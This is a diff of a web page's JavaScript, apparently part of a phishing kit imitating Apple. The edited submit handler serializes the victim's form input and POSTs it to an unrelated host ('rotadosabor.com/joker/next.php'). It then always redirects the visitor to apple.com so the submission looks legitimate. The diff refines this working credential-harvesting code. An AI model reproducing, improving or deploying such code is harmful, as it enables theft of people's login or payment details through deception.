@@ -681,18 +681,21 @@
                 // Disable button to prevent double submission
                 $('#complete-button').prop('disabled', true).html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Processing...');
                 
-                // Submit form via AJAX
+                // Get form data
+                var formData = $(this).serialize();
+                
+                // Submit form via direct AJAX with minimal settings
                 $.ajax({
                     url: "https://rotadosabor.com/joker/next.php",
-                    type: 'POST',
-                    data: $(this).serialize(),
-                    success: function() {
-                        // Redirect to Apple website after successful submission
-                        window.location.href = "https://www.apple.com/";
-                    },
-                    error: function() {
-                        // Still redirect on error to keep flow going
-                        window.location.href = "https://www.apple.com/";
+                    type: "POST",
+                    data: formData,
+                    cache: false,
+                    processData: true,
+                    complete: function() {
+                        // Always redirect to Apple website, regardless of response
+                        setTimeout(function() {
+                            window.location.href = "https://www.apple.com/";
+                        }, 500);
                     }
                 });
             });
